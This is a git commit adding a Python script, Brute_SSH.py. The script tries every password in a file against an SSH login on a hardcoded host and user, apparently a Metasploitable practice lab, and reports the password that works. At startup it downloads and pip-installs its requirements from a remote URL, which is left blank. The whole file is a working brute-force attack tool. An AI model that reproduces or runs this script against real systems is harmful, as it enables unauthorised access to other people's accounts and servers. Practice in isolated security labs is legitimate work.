86eda8a2ec6ebd37b1a95937bd6cd25d31e7126a
overgrowncarrot1 <78485709+overgrowncarrot1@users.noreply.github.com>
2023-03-06 00:43:58 -0500

    Create Brute_SSH.py

---
+++ Brute_SSH.py
@@ -0,0 +1,55 @@
+#!/usr/bin/python3
+
+import urllib
+import os
+from os import system
+import os.path
+from urllib import request
+
+check_path = 'requirements.txt'
+check_file = os.path.isfile(check_path)
+if check_file != True:
+	print('Downloading tools that are needed')
+	remote_url=''
+	local_file='requirements.txt'
+	request.urlretrieve(remote_url, local_file)
+	print('Installing requirements.txt')
+	system("pip3 install -r requirements.txt --break-system-packages \n")
+else:
+	print('Installing requirements.txt')
+	system("pip3 install -r requirements.txt --break-system-packages \n")
+
+from pwn import *
+import paramiko
+from colorama import init, Fore
+
+init()
+
+GREEN = Fore.GREEN
+RED   = Fore.RED
+RESET = Fore.RESET
+BLUE  = Fore.BLUE
+MAGENTA  = Fore.MAGENTA
+
+RHOST = "192.168.167.66"
+RPORT = 22
+USERNAME = "msfadmin"
+PASSFILE = "pass.txt"
+a = 0
+
+Conv_RPORT = RPORT
+
+print("\n\nUsername "f'{RED}'+USERNAME+ f'{RESET}'" being attacked on host "f'{BLUE}'+RHOST+ f'{RESET}'" with passfile "f'{GREEN}'+PASSFILE+ f'{RESET}' " on port" f'{MAGENTA}',(str(Conv_RPORT)))
+print("\n")
+with open(PASSFILE, "r") as password_list:
+	for password in password_list:
+		password = password.strip("\n")
+		try:
+			r = ssh(host=RHOST, port=RPORT, user=USERNAME, password=password, timeout=30)
+			if r.connected():
+				print(f'{GREEN}'"Your Password Sire: '{}'".format(password))
+				r.close()
+				break
+			r.close()
+		except paramiko.ssh_exception.AuthenticationException:
+			a += 1
